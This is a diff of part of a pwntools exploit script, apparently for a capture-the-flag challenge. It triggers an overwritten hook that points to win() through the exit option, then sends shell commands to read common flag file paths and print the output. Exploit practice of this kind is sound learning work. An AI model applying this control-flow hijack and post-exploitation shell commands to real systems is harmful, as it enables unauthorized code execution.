@@ -139,14 +139,21 @@ log.success(f'win() ({hex(win)}) written to hook @ {hex(hook)}')
 # Step 8: trigger hook via exit (option 5)
 log.info('triggering hook via exit…')
 r.sendline(b'5')
-try:
-    # If win() drops us into a shell, proactively try common flag paths.
-    cmd = (
-        b'cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null || '
-        b'cat flag 2>/dev/null || cat flag.txt 2>/dev/null'
-    )
-    r.sendline(cmd)
-except EOFError:
-    pass
+out = r.recvrepeat(1.5)
 
-r.interactive()
+if not out:
+    try:
+        # Fallback: if win() spawned a shell, request common flag paths.
+        cmd = (
+            b'cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null || '
+            b'cat flag 2>/dev/null || cat flag.txt 2>/dev/null'
+        )
+        r.sendline(cmd)
+        out = r.recvrepeat(2.0)
+    except EOFError:
+        pass
+
+if out:
+    print(out.decode(errors='ignore'), end='')
+else:
+    log.warning('No output received after trigger (connection likely closed).')
